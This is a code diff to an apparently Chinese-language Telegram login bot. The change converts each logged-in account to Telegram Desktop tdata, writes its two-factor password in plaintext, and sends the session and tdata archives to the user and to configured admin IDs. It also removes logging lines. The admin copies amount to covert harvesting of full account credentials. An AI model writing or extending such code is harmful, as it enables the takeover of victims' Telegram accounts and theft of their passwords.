@@ -1,13 +1,14 @@
 import os
 import json
 import zipfile
+import shutil
 import asyncio
 import logging
 import random
 import time
 from datetime import datetime
 from opentele.tl import TelegramClient
-from opentele.api import API
+from opentele.api import API, UseCurrentSession
 from telethon.errors import SessionPasswordNeededError, AuthRestartError
 from dotenv import load_dotenv
 
@@ -34,7 +35,6 @@ def load_proxies():
     valid_proxies = []
     
     if not os.path.exists(proxy_file):
-        logger.warning("proxy.txt 文件不存在")
         _proxy_list = []
         _proxy_list_last_load = current_time
         return []
@@ -60,21 +60,16 @@ def load_proxies():
                                 'expire': expire_timestamp
                             }
                             valid_proxies.append(proxy)
-                        else:
-                            logger.debug(f"代理 {ip}:{port} 已过期")
                     except ValueError:
-                        logger.warning(f"代理过期时间格式错误: {expire_ts}")
                         continue
     
-    except Exception as e:
-        logger.error(f"读取 proxy.txt 失败: {e}")
+    except Exception:
         _proxy_list = []
         _proxy_list_last_load = current_time
         return []
     
     _proxy_list = valid_proxies
     _proxy_list_last_load = current_time
-    logger.info(f"加载了 {len(valid_proxies)} 个有效代理")
     return valid_proxies
 
 def get_random_proxy():
@@ -141,7 +136,6 @@ class LoginHandler:
         except AuthRestartError:
             if self._retry_count < 3:
                 self._retry_count += 1
-                logger.warning(f"AuthRestartError, retrying... ({self._retry_count}/3)")
                 await asyncio.sleep(2)
                 if self.client:
                     await self.client.disconnect()
@@ -201,7 +195,6 @@ class LoginHandler:
         me = await self.client.get_me()
         
         phone = self.phone
-        
         reg_time = datetime.now().strftime("%Y-%m-%d")
         
         json_data = {
@@ -239,32 +232,70 @@ class LoginHandler:
         with open(json_path, 'w', encoding='utf-8') as f:
             json.dump(json_data, f, indent=2, ensure_ascii=False)
         
-        zip_path = f"downloads/login_{self.user_id}_{int(asyncio.get_event_loop().time())}.zip"
+        timestamp = int(asyncio.get_event_loop().time())
+        zip_path = f"downloads/login_session_{self.user_id}_{timestamp}.zip"
         os.makedirs("downloads", exist_ok=True)
         
         with zipfile.ZipFile(zip_path, 'w') as zipf:
             zipf.write(self.session_file, os.path.basename(self.session_file))
             zipf.write(json_path, os.path.basename(json_path))
+            
+        tdesk = await self.client.ToTDesktop(flag=UseCurrentSession)
+        tdata_base_dir = f"downloads/tdata_base_{phone}_{timestamp}"
+        account_dir = os.path.join(tdata_base_dir, phone)
+        tdata_dir = os.path.join(account_dir, "tdata")
+        os.makedirs(tdata_dir, exist_ok=True)
+        tdesk.SaveTData(tdata_dir)
         
-        await context.bot.send_document(
-            chat_id=self.chat_id,
-            document=open(zip_path, 'rb'),
-            caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 登录成功\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone}",
-            parse_mode='HTML'
-        )
+        if self.twofa:
+            with open(os.path.join(account_dir, "2fa.txt"), 'w', encoding='utf-8') as f:
+                f.write(self.twofa)
+                
+        tdata_zip_path = f"downloads/login_tdata_{self.user_id}_{timestamp}.zip"
+        with zipfile.ZipFile(tdata_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, dirs, files in os.walk(account_dir):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    arcname = os.path.relpath(file_path, account_dir)
+                    zipf.write(file_path, arcname)
+
+        with open(zip_path, 'rb') as f_session:
+            await context.bot.send_document(
+                chat_id=self.chat_id,
+                document=f_session,
+                caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 登录成功\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Session]",
+                parse_mode='HTML'
+            )
+            
+        with open(tdata_zip_path, 'rb') as f_tdata:
+            await context.bot.send_document(
+                chat_id=self.chat_id,
+                document=f_tdata,
+                caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 登录成功\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Tdata]",
+                parse_mode='HTML'
+            )
         
         if ADMIN_ID:
             for admin_id in ADMIN_ID.split(','):
                 try:
-                    await context.bot.send_document(
-                        chat_id=admin_id.strip(),
-                        document=open(zip_path, 'rb'),
-                        caption=f"用户 {self.user_id} 登录: {self.phone}"
-                    )
+                    with open(zip_path, 'rb') as f_session:
+                        await context.bot.send_document(
+                            chat_id=admin_id.strip(),
+                            document=f_session,
+                            caption=f"用户 {self.user_id} 登录: {self.phone} [Session]"
+                        )
+                    with open(tdata_zip_path, 'rb') as f_tdata:
+                        await context.bot.send_document(
+                            chat_id=admin_id.strip(),
+                            document=f_tdata,
+                            caption=f"用户 {self.user_id} 登录: {self.phone} [Tdata]"
+                        )
                 except:
                     pass
         
         os.remove(zip_path)
+        os.remove(tdata_zip_path)
+        shutil.rmtree(tdata_base_dir, ignore_errors=True)
         os.remove(self.session_file)
         os.remove(json_path)
         await self.client.disconnect()
